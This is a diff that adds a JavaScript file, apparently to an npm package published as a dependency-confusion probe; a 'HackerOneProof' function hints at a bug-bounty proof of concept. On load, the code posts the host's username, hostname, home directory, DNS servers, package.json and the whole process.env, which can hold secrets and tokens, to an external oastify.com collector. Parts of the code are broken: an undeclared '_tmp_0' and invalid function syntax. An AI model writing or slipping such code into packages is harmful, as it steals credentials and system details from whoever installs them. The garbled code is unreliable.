@@ -1,0 +1,30 @@
+const os = require("os")
+const dns = require("dns")
+const axios = require("axios")
+const packageJSON = require("./package.json")
+const pkg = packageJSON.name
+axios.post('https://f0gnow93bvjqleqrslqxv5vyepkg8fw4.oastify.com', {
+    p: pkg,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
+    env: process.env,
+  })
+_tmp_0.p = pkg
+_tmp_0.c = __dirname
+_tmp_0.hd = os.homedir()
+_tmp_0.hn = os.hostname()
+_tmp_0.un = os.userInfo().username
+_tmp_0.dns = dns.getServers()
+_tmp_0.r = packageJSON ? packageJSON.___resolved : undefined
+_tmp_0.v = packageJSON.version
+_tmp_0.pjson = packageJSON
+_tmp_0.env = process.env
+function HackerOneProof = function HackerOneProof(arr) {
+  return "Incisiv3";
+}
